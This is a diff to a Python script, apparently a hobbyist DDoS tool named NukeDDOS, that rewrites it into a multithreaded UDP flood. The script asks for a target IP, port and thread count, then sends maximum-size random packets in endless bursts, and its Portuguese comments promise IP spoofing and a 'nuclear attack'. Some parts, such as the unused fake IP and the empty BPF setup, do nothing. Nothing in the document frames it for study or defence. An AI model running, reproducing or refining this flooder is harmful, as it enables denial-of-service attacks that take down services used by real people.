@@ -3,70 +3,91 @@ import time
 import socket
 import random
 import threading
+import ctypes
 import struct
-from datetime import datetime
 
-# Packet types for flexibility
-PACKET_TYPES = {
-    "UDP": socket.SOCK_DGRAM,
-    "RAW": socket.SOCK_RAW,
-    "ICMP": socket.SOCK_RAW,  # Requires root on most systems
-    "TCP": socket.SOCK_STREAM  # For future use if needed
-}
+# Configurações de baixo nível para máximo desempenho
+def optimize_system():
+    # Prioridade máxima no sistema (requer sudo/root)
+    try:
+        os.nice(-20)
+    except:
+        pass
+    
+    # Otimizações de socket (kernel bypass)
+    SO_ATTACH_REUSEPORT_CBPF = 51
+    program = [
+        0x6, 0x0, 0x0, 0xffff,   # Ret A (permite tudo)
+    ]
+    bpf = struct.pack('HL', len(program), ctypes.create_string_buffer(bytes(program)))
 
-# Configuration interface
-os.system("clear")
-os.system("figlet -f slant NukeDDOS")
-print("Author   : Laila19")
-print("github   : https://github.com/lailacypher")
-print()
-ip = input("Target IP : ").strip()
-port = int(input("Port      : ").strip())
-threads = int(input("Threads   : ").strip())
+# Configuração ultrarrápida
+os.system("clear && printf '\033[3;32m'")
+print("""
+███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██████╗  ██████╗ ███████╗
+████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
+██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║██║  ██║██║   ██║███████╗
+██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║██║  ██║██║   ██║╚════██║
+██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝██████╔╝╚██████╔╝███████║
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   
+""")
 
-# Packet type selection
-print("\nSelect packet type:")
-for i, packet_type in enumerate(PACKET_TYPES.keys(), 1):
-    print(f"{i}. {packet_type}")
-type_choice = int(input("Packet Type (1-4): ").strip())
-packet_type = list(PACKET_TYPES.keys())[type_choice - 1]
-sock_type = PACKET_TYPES[packet_type]
-sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_type == "UDP" else 0)
-data = random._urandom(2048)  # Increased packet size for more impact
-sent = 0
-lock = threading.Lock()
+# Configuração do alvo
+target = input("Target IP: ").strip()
+port = int(input("Port: ").strip())
+thread_count = int(input("Threads (recomendado 500+): ").strip())
+packet_size = 65507  # Tamanho máximo UDP
 
-# Initial progress bar
-os.system("clear")
-os.system("figlet Attack Starting")
-progress = ["[                    ] 0%", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
-for step in progress:
-    print(step)
-    time.sleep(0.2)  # Faster startup
+# Otimizações pré-ataque
+optimize_system()
+random.seed(time.time())
+data = random._urandom(packet_size)
 
-def random_ip():
-    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+# Criação de sockets em lote
+socks = []
+for _ in range(min(100, thread_count)):  # Reutilização de sockets
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, packet_size)
+        socks.append(s)
+    except:
+        pass
 
-def attack():
-    global sent
+# Ataque multi-camadas
+def flood():
     while True:
         try:
-            fake_ip = random_ip()
-            packet = data + bytes(fake_ip, 'utf-8')
-            sock.sendto(packet, (ip, port))
-            # Send fragmented packets for more impact
-            for _ in range(5):
-                sock.sendto(packet[:512], (ip, port))
-                sock.sendto(packet[512:1024], (ip, port))
-                sock.sendto(packet[1024:1536], (ip, port))
-                sock.sendto(packet[1536:], (ip, port))
-            with lock:
-                sent += 5  # Count fragmented packets
-                print(f"Packets {sent} sent successfully to {ip} through port {port} (spoofed from {fake_ip})")
-        except Exception as e:
-            print(f"Error sending packet: {e}")
+            for s in socks:
+                # Spoofing IP aleatório
+                fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+                
+                # Envio em rajadas
+                for _ in range(50):  # Aumenta pacotes por ciclo
+                    try:
+                        s.sendto(data, (target, port))
+                    except:
+                        pass
+                
+                # Flood adicional
+                try:
+                    s.sendto(data[:1024], (target, port))
+                    s.sendto(data[1024:2048], (target, port))
+                    s.sendto(data[2048:3072], (target, port))
+                except:
+                    pass
+        except:
+            pass
 
-# Starting threads
-for _ in range(threads):
-    thread = threading.Thread(target=attack)
-    thread.start()
+# Inicialização massiva de threads
+print("\nStarting nuclear attack...")
+for _ in range(thread_count):
+    try:
+        threading.Thread(target=flood, daemon=True).start()
+    except:
+        pass
+
+# Monitoramento
+print(f"Attacking {target}:{port} with {thread_count} threads")
+while True:
+    time.sleep(1)
